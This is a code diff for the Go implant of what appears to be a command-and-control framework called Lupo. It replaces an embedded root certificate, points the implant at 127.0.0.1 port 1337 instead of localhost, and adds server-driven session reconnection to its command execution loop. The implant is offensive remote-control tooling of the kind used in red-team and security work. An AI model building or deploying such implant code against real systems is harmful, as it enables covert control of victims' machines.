@@ -34,19 +34,19 @@ type lupoImplant struct {
 var implant *lupoImplant
 
 var rootCert string = `-----BEGIN CERTIFICATE-----
-MIICaTCCAe6gAwIBAgIUVRy7z3rKfabM/couCA0ghfNzGwcwCgYIKoZIzj0EAwIw
+MIICaDCCAe6gAwIBAgIUYLDpgVk6sWoVs8YncVZb1fyia48wCgYIKoZIzj0EAwIw
 XTELMAkGA1UEBhMCVVMxDTALBgNVBAgMBEx1cG8xDTALBgNVBAcMBEx1cG8xDTAL
-BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xEjAQBgNVBAMMCWxvY2FsaG9zdDAe
-Fw0yMTEwMjgyMDI3NTFaFw0zMTEwMjYyMDI3NTFaMF0xCzAJBgNVBAYTAlVTMQ0w
+BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xEjAQBgNVBAMMCTEyNy4wLjAuMTAe
+Fw0yMjExMDQxODI1NDVaFw0zMjExMDExODI1NDVaMF0xCzAJBgNVBAYTAlVTMQ0w
 CwYDVQQIDARMdXBvMQ0wCwYDVQQHDARMdXBvMQ0wCwYDVQQKDARMdXBvMQ0wCwYD
-VQQLDARMdXBvMRIwEAYDVQQDDAlsb2NhbGhvc3QwdjAQBgcqhkjOPQIBBgUrgQQA
-IgNiAASEmaFjTtZewJSD4DIcH4vaCMcE1nzy+CtPOL6QsQTejc5x9s517IiKATDB
-G07+1u+3lG1oWYFkPWsYsM02xibsuydXw0KahiYzK+q9lvQ5ASUNldoXVP3F1tYO
-U/RgRDujbzBtMB0GA1UdDgQWBBQtzy5ENcL4udijGCSz/QRlWLklfDAfBgNVHSME
-GDAWgBQtzy5ENcL4udijGCSz/QRlWLklfDAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
-EQQTMBGCCWxvY2FsaG9zdIcEfwAAATAKBggqhkjOPQQDAgNpADBmAjEA+l0W2zYK
-cm11jVMfe+K3yf0eZLiy2LULGpALhxTRfys7jYFOM5luYC7n1Q5jDmYhAjEAreSi
-hU5g5fW4qkv0sYGeXUhIKdKkqavwl/+jqgV6yGkioprtbzZLR+xAMryfX1pa
+VQQLDARMdXBvMRIwEAYDVQQDDAkxMjcuMC4wLjEwdjAQBgcqhkjOPQIBBgUrgQQA
+IgNiAARByJuNeJHhznNJKGCnP4qfDdf2rBRpn9HMAgik1OuFY7DmcSqom52lqZa+
+SX6VZmgl+VvzaxKe6hZkpYlxPXxCIE5iNBSn0nox6mPJwIchUph2NA78MVh7h1fn
+6YWj562jbzBtMB0GA1UdDgQWBBQcYBUg4If+4KCWvwTAua9L1TuaxTAfBgNVHSME
+GDAWgBQcYBUg4If+4KCWvwTAua9L1TuaxTAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
+EQQTMBGCCTEyNy4wLjAuMYcEfwAAATAKBggqhkjOPQQDAgNoADBlAjEAiZhS4ek6
+XYNuX0v2bLC10tXwD/U/JAAj/s+ksHfS6Pe7KMSMeDmtaHzPQLGcPEAxAjBY4qv9
+Fb/3Nn0/dl3V11rvAExZ10P2PsuceIwFUu/ICj60OLhC9aTuw+jp9EbkGC0=
 -----END CERTIFICATE-----
 `
 
@@ -57,7 +57,7 @@ func main() {
 	implant = &lupoImplant{
 		updateInterval: 1,
 		protocol:       "https://",
-		rhost:          "localhost",
+		rhost:          "127.0.0.1",
 		rport:          1337,
 		id:             -1,
 		uuid:           "",
@@ -166,6 +166,13 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 		err = json.Unmarshal(jsonData, &serverResponse)
 
 		if err != nil {
+			return
+		}
+
+		// In case of server side issue where we request a session reconnect, set the new session info for the implant structure
+		if serverResponse["UUID"] != nil {
+			implant.id = int(serverResponse["sessionID"].(float64))
+			implant.uuid = serverResponse["UUID"].(string)
 			return
 		}
 
